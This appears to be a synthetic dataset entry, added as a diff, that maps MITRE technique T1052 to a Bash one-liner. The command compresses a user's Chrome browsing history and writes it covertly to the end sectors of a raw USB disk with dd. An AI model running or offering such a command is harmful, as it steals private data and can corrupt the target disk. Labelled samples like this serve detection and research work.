@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1052",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "gzip -c \"$HOME/.config/google-chrome/Default/History\" 2>/dev/null | dd of=\"/dev/sdb\" bs=1M seek=$(( $(blockdev --getsz /dev/sdb) / 2048 - 8 )) conv=notrunc,fsync status=none",
+  "explanation": "Compresses the Chrome history database and writes it near the end of the USB disk with a MiB-aligned seek, reducing likelihood of overwriting partition metadata.",
+  "rationale_steps": [
+    "Compress a browser history database if present",
+    "Compute an end-of-disk seek in 1 MiB units using total sector count",
+    "Write the stream into late disk sectors using dd with notrunc and fsync"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1052-4585860b-7026c61e",
+  "source_prompt_hash": "4585860b",
+  "timestamp_utc": "2025-09-30T05:09:05.177002Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
